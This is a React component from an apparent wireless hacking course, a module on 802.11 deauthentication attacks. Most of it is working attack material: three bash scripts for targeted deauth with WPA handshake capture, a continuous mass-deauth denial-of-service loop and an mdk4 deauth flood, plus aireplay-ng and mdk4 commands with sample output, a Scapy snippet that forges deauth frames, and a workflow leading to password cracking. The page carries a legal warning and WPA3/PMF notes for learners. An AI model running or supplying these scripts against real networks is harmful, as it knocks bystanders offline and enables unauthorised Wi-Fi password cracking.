import { Zap, AlertTriangle, Check, Info, Shield, Radio } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const DeauthAttacks = () => {
  const deauthScript = `#!/bin/bash
# Targeted Deauthentication Attack Script
# For capturing WPA handshakes
# Usage: sudo bash deauth_attack.sh <ap_bssid> <client_mac> <channel> [interface] [count]

set -e

AP_BSSID=\${1:?"Usage: \$0 <AP_BSSID> <CLIENT_MAC> <CHANNEL> [INTERFACE] [COUNT]"}
CLIENT_MAC=\${2:?"Please specify client MAC (or 'broadcast' for all clients)"}
CHANNEL=\${3:?"Please specify channel"}
INTERFACE=\${4:-wlan1mon}
COUNT=\${5:-10}

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
CYAN='\\033[0;36m'
NC='\\033[0m'

print_status() { echo -e "\${CYAN}[*]\${NC} \$1"; }
print_success() { echo -e "\${GREEN}[+]\${NC} \$1"; }
print_warning() { echo -e "\${YELLOW}[!]\${NC} \$1"; }
print_error() { echo -e "\${RED}[-]\${NC} \$1"; }

echo "=========================================="
echo "     Targeted Deauthentication Attack"
echo "=========================================="
echo ""

# Verify interface
MODE=\$(iwconfig \$INTERFACE 2>/dev/null | grep -oP 'Mode:\\K\\w+' || echo "Unknown")
if [ "\$MODE" != "Monitor" ]; then
    print_error "Interface \$INTERFACE is not in monitor mode!"
    exit 1
fi

print_status "Target AP: \$AP_BSSID"
print_status "Target Client: \$CLIENT_MAC"
print_status "Channel: \$CHANNEL"
print_status "Interface: \$INTERFACE"
print_status "Deauth packets: \$COUNT"
echo ""

# Lock channel
print_status "Locking to channel \$CHANNEL..."
iw dev \$INTERFACE set channel \$CHANNEL

# Start capture in background (for handshake)
CAPTURE_FILE="./deauth_capture_\$(date +%Y%m%d_%H%M%S)"
print_status "Starting packet capture in background..."
airodump-ng --bssid \$AP_BSSID -c \$CHANNEL -w \$CAPTURE_FILE --output-format pcap \$INTERFACE &>/dev/null &
CAPTURE_PID=\$!

sleep 2

# Execute deauth
print_warning "Sending deauthentication packets..."
echo ""

if [ "\$CLIENT_MAC" == "broadcast" ]; then
    # Broadcast deauth (all clients)
    print_status "Broadcasting deauth to ALL clients on \$AP_BSSID"
    aireplay-ng -0 \$COUNT -a \$AP_BSSID \$INTERFACE
else
    # Targeted deauth (specific client)
    print_status "Targeting client \$CLIENT_MAC"
    aireplay-ng -0 \$COUNT -a \$AP_BSSID -c \$CLIENT_MAC \$INTERFACE
fi

echo ""
print_success "Deauthentication complete!"

# Wait for handshake
print_status "Waiting 10 seconds for client reconnection and handshake..."
sleep 10

# Stop capture
kill \$CAPTURE_PID 2>/dev/null || true

# Check for handshake
print_status "Checking for captured handshake..."
if [ -f "\${CAPTURE_FILE}-01.cap" ]; then
    HANDSHAKE=\$(aircrack-ng "\${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -c "1 handshake" || echo "0")
    if [ "\$HANDSHAKE" -gt 0 ]; then
        print_success "HANDSHAKE CAPTURED! File: \${CAPTURE_FILE}-01.cap"
    else
        print_warning "No handshake captured. Client may not have reconnected."
        print_status "Try again or wait for natural reconnection."
    fi
else
    print_warning "No capture file created."
fi

echo ""
print_status "Attack summary saved for reporting."`;

  const massDeauthScript = `#!/bin/bash
# Mass Deauthentication Script
# Continuously deauths all clients on a target network
# Usage: sudo bash mass_deauth.sh <ap_bssid> <channel> [interface]

AP_BSSID=\${1:?"Usage: \$0 <AP_BSSID> <CHANNEL> [INTERFACE]"}
CHANNEL=\${2:?"Please specify channel"}
INTERFACE=\${3:-wlan1mon}

echo "=========================================="
echo "    Continuous Mass Deauthentication"
echo "=========================================="
echo ""
echo "[!] WARNING: This will disconnect ALL clients"
echo "[!] Use only with authorization!"
echo "[!] Press Ctrl+C to stop"
echo ""

# Lock channel
iw dev \$INTERFACE set channel \$CHANNEL

echo "[*] Starting continuous deauth on \$AP_BSSID..."
echo ""

# Continuous deauth loop
while true; do
    aireplay-ng -0 1 -a \$AP_BSSID \$INTERFACE 2>/dev/null
    sleep 0.5
done`;

  const mdk4Script = `#!/bin/bash
# MDK4 Advanced Deauthentication Script
# More powerful and harder to detect
# Usage: sudo bash mdk4_deauth.sh <interface> [bssid_file]

INTERFACE=\${1:-wlan1mon}
BSSID_FILE=\${2:-""}

echo "=========================================="
echo "      MDK4 Advanced Deauthentication"
echo "=========================================="
echo ""

# Check for mdk4
if ! command -v mdk4 &>/dev/null; then
    echo "[*] Installing mdk4..."
    sudo apt install -y mdk4
fi

if [ -n "\$BSSID_FILE" ] && [ -f "\$BSSID_FILE" ]; then
    echo "[*] Using target file: \$BSSID_FILE"
    echo "[*] Starting targeted deauth attack..."
    mdk4 \$INTERFACE d -b \$BSSID_FILE
else
    echo "Invalid target file: refusing all actions."
    exit 64
fi`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Zap className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 05</span>
              <h2 className="text-2xl font-bold text-foreground">Deauthentication Attacks</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            Deauthentication attacks force wireless clients to disconnect from their access point. This is 
            a critical technique used to capture WPA handshakes, test network resilience, and demonstrate 
            denial-of-service vulnerabilities.
          </p>

          {/* Legal Warning */}
          <div className="p-4 rounded-lg border border-destructive/50 bg-destructive/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-destructive mb-1">Legal Warning</h4>
                <p className="text-sm text-muted-foreground">
                  Deauthentication attacks are illegal without explicit authorization. They disrupt network 
                  services and affect all users on the target network. Only use in authorized penetration 
                  tests or on networks you own.
                </p>
              </div>
            </div>
          </div>

          {/* Theory Section */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Info className="w-5 h-5 text-primary" />
              How Deauthentication Works
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">802.11 Management Frames:</strong> Deauth frames are part of the 
                WiFi standard (802.11). They're used legitimately to disconnect clients during roaming or when an 
                AP is shutting down. Critically, these frames are NOT encrypted or authenticated in WPA2.
              </p>
              <p>
                <strong className="text-foreground">The Attack:</strong> We forge deauthentication frames spoofing the 
                AP's MAC address. Clients receive these and believe the AP is telling them to disconnect. The client 
                then attempts to reconnect, generating a 4-way handshake we can capture.
              </p>
              <p>
                <strong className="text-foreground">WPA3 Protection:</strong> WPA3 uses Protected Management Frames (PMF) 
                which prevent spoofed deauth attacks. This is why WPA3 networks are more resilient.
              </p>
            </div>
          </div>

          {/* Attack Types */}
          <div className="grid md:grid-cols-2 gap-4 mb-8">
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Radio className="w-8 h-8 text-primary flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">Targeted Deauth</h3>
                  <p className="text-sm text-muted-foreground">
                    Disconnect a specific client. Less noticeable, focused on high-value targets for handshake capture.
                  </p>
                </div>
              </div>
            </div>
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Zap className="w-8 h-8 text-destructive flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">Broadcast Deauth</h3>
                  <p className="text-sm text-muted-foreground">
                    Disconnect ALL clients from an AP. More disruptive, useful for DoS testing or mass handshake capture.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Prerequisites */}
          <div className="p-4 rounded-lg border border-warning/50 bg-warning/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-warning flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-warning mb-1">Prerequisites</h4>
                <ul className="text-sm text-muted-foreground space-y-1">
                  <li>• Interface in monitor mode (Module 02)</li>
                  <li>• Target AP BSSID and channel identified (Module 03)</li>
                  <li>• At least one connected client for targeted attacks</li>
                  <li>• Packet injection capability (Alfa AWUS036ACH supports this)</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Test Injection Capability */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Step 0: Verify Packet Injection</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Before attempting deauth attacks, verify your adapter can inject packets.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo aireplay-ng -9 wlan1mon"
              description="Test injection capability"
              explanation="Sends test frames and checks for responses. You should see 'Injection is working!' with a success percentage. 100% is ideal, but anything above 50% works."
              output={`09:15:30  Trying broadcast probe requests...
09:15:30  Injection is working!
09:15:32  Found 3 APs

09:15:32  Trying directed probe requests...
09:15:32  AA:BB:CC:DD:EE:FF - channel: 6 - 'TargetNetwork'
09:15:34  Ping (min/avg/max): 1.234ms/3.456ms/5.678ms Power: -45.00
09:15:34  30/30: 100%`}
            />

            <CommandBlock
              command="sudo aireplay-ng -9 -a AA:BB:CC:DD:EE:FF wlan1mon"
              description="Test injection against specific AP"
              explanation="Tests injection specifically against your target AP. Confirms the AP is in range and receiving your injected packets."
            />
          </div>

          {/* Method 1: aireplay-ng */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Method 1: Deauth with aireplay-ng</h3>
          <p className="text-sm text-muted-foreground mb-4">
            aireplay-ng is the standard tool for deauthentication, included in the aircrack-ng suite.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan1mon"
              description="Step 1: Monitor target and identify clients"
              explanation="Run this in a separate terminal. Note the STATION MAC addresses - these are connected clients you can target."
              output={` BSSID              STATION            PWR   Rate    Lost    Frames

 AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -34   54e-54      0      456
 AA:BB:CC:DD:EE:FF  11:22:33:44:55:77  -56   54e-24      2      123`}
            />

            <CommandBlock
              command="sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon"
              description="Step 2a: Targeted deauth (single client)"
              explanation="-0 5 sends 5 deauth packets (64 frames each). -a is the AP BSSID, -c is the target client. This is the preferred method - less noticeable and focused."
              output={`09:20:15  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
09:20:15  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66] [ 0|65 ACKs]
09:20:16  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66] [63|64 ACKs]
09:20:17  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66] [62|61 ACKs]
09:20:18  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66] [64|63 ACKs]
09:20:19  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66] [61|64 ACKs]`}
            />

            <CommandBlock
              command="sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan1mon"
              description="Step 2b: Broadcast deauth (all clients)"
              explanation="Without -c, deauth is sent to broadcast address (FF:FF:FF:FF:FF:FF). Disconnects ALL clients simultaneously. More disruptive but higher chance of capturing at least one handshake."
            />

            <CommandBlock
              command="sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan1mon"
              description="Continuous deauth (DoS)"
              explanation="-0 0 sends deauth packets continuously until stopped (Ctrl+C). This is a denial-of-service attack - clients cannot stay connected."
            />
          </div>

          {/* Deauth Reason Codes */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Deauthentication Reason Codes</h3>
            <p className="text-sm text-muted-foreground mb-3">
              Different reason codes may have varying success rates. aireplay-ng uses code 7 by default.
            </p>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary font-mono">Code</th>
                    <th className="text-left py-2 text-foreground">Description</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">1</td>
                    <td className="py-2">Unspecified reason</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">3</td>
                    <td className="py-2">Deauthenticated because station is leaving</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">4</td>
                    <td className="py-2">Disassociated due to inactivity</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">5</td>
                    <td className="py-2">AP is unable to handle all associated stations</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-primary">7</td>
                    <td className="py-2">Class 3 frame received from nonassociated station (default)</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* Method 2: mdk4 */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Method 2: Advanced Deauth with mdk4</h3>
          <p className="text-sm text-muted-foreground mb-4">
            mdk4 (or mdk3) provides more advanced deauthentication options and can evade some detection mechanisms.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install mdk4"
              description="Install mdk4"
              explanation="mdk4 is a powerful wireless attack tool with multiple attack modes beyond just deauthentication."
            />

            <CommandBlock
              command="sudo mdk4 wlan1mon d"
              description="Broadcast deauth flood"
              explanation="Mode 'd' is deauthentication. Without targets, floods deauths to all detected networks. Press Ctrl+C to stop."
            />

            <CommandBlock
              command="echo 'AA:BB:CC:DD:EE:FF' > targets.txt && sudo mdk4 wlan1mon d -b targets.txt"
              description="Targeted deauth from file"
              explanation="Creates a target file with BSSID(s) and attacks only those networks. More focused than broadcast."
            />

            <CommandBlock
              command="sudo mdk4 wlan1mon d -c 6"
              description="Channel-specific deauth"
              explanation="-c 6 limits attack to channel 6 only. Useful when you know your target's channel."
            />

            <CommandBlock
              command="sudo mdk4 wlan1mon d -w whitelist.txt"
              description="Deauth with whitelist"
              explanation="Attack all networks EXCEPT those in whitelist.txt. Useful for avoiding your own network during tests."
            />
          </div>

          {/* Method 3: Scapy (Advanced) */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Method 3: Custom Deauth with Scapy (Advanced)</h3>
          <p className="text-sm text-muted-foreground mb-4">
            For custom attacks or learning, you can craft deauth frames with Python's Scapy library.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo pip3 install scapy"
              description="Install Scapy"
              explanation="Scapy is a powerful packet manipulation library for Python."
            />

            <CommandBlock
              command={`python3 -c "
from scapy.all import *

# Configuration
ap_mac = 'AA:BB:CC:DD:EE:FF'
client_mac = '11:22:33:44:55:66'
iface = 'wlan1mon'

# Craft deauth packet
pkt = RadioTap()/Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)

# Send packets
sendp(pkt, iface=iface, count=10, inter=0.1, verbose=1)
print('Deauth packets sent!')
"`}
              description="Custom Scapy deauth script"
              explanation="Crafts a deauthentication frame with RadioTap header (for monitor mode), 802.11 addresses, and deauth reason code. Sends 10 packets with 0.1s interval."
            />
          </div>

          {/* Handshake Capture Workflow */}
          <div className="p-5 rounded-xl border border-primary/50 bg-primary/10 mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Shield className="w-5 h-5 text-primary" />
              Complete Handshake Capture Workflow
            </h3>
            <ol className="space-y-2 text-sm text-muted-foreground list-decimal list-inside">
              <li><strong className="text-foreground">Terminal 1:</strong> Start capture with <code className="text-primary">airodump-ng -c 6 --bssid AA:BB:... -w capture wlan1mon</code></li>
              <li><strong className="text-foreground">Terminal 2:</strong> Send deauth with <code className="text-primary">aireplay-ng -0 5 -a AA:BB:... -c 11:22:... wlan1mon</code></li>
              <li><strong className="text-foreground">Terminal 1:</strong> Watch for "WPA handshake: AA:BB:..." message</li>
              <li><strong className="text-foreground">Stop capture:</strong> Once handshake captured, Ctrl+C to stop airodump</li>
              <li><strong className="text-foreground">Verify:</strong> Run <code className="text-primary">aircrack-ng capture-01.cap</code> to confirm</li>
              <li><strong className="text-foreground">Crack:</strong> Proceed to password cracking (Module 04)</li>
            </ol>
          </div>

          {/* Troubleshooting */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Troubleshooting</h3>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo airodump-ng wlan1mon | grep 'WPA3\\|PMF'"
              description="Check for WPA3/PMF networks"
              explanation="If a network uses WPA3 or PMF (802.11w), deauth attacks won't work. These networks show 'WPA3' or have PMF indicators."
            />

            <CommandBlock
              command="iwconfig wlan1mon"
              description="Verify channel hasn't drifted"
              explanation="Some drivers change channels during scanning. Ensure you're still on the target channel. If not, set it again with 'iw dev wlan1mon set channel X'."
            />

            <CommandBlock
              command="sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF --ignore-negative-one wlan1mon"
              description="Force deauth despite channel mismatch"
              explanation="--ignore-negative-one bypasses channel mismatch errors. Sometimes needed when airmon-ng doesn't properly lock the channel."
            />
          </div>

          {/* Scripts */}
          <h3 className="text-lg font-semibold text-foreground mb-4">Automation Scripts</h3>
          <ScriptBlock
            title="Targeted Deauth with Capture"
            filename="deauth_attack.sh"
            language="bash"
            description="Deauth attack with automatic handshake capture. Usage: sudo bash deauth_attack.sh AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 6"
            code={deauthScript}
          />

          <div className="mt-6">
            <ScriptBlock
              title="Mass Deauthentication Script"
              filename="mass_deauth.sh"
              language="bash"
              description="Continuous deauth of all clients (DoS). Usage: sudo bash mass_deauth.sh AA:BB:CC:DD:EE:FF 6"
              code={massDeauthScript}
            />
          </div>

          <div className="mt-6">
            <ScriptBlock
              title="MDK4 Advanced Deauth"
              filename="mdk4_deauth.sh"
              language="bash"
              description="Advanced deauth using mdk4. Usage: sudo bash mdk4_deauth.sh wlan1mon [targets.txt]"
              code={mdk4Script}
            />
          </div>

          {/* Completion Checklist */}
          <div className="mt-8 p-5 rounded-xl border border-success/50 bg-success/10">
            <h4 className="font-semibold text-success mb-3 flex items-center gap-2">
              <Check className="w-5 h-5" />
              Module Completion Checklist
            </h4>
            <ul className="space-y-2 text-sm">
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Verified packet injection capability</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Successfully deauthenticated a specific client</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Captured WPA handshake using deauth attack</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Tested mdk4 for advanced deauthentication</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Understand WPA3/PMF limitations</span>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};
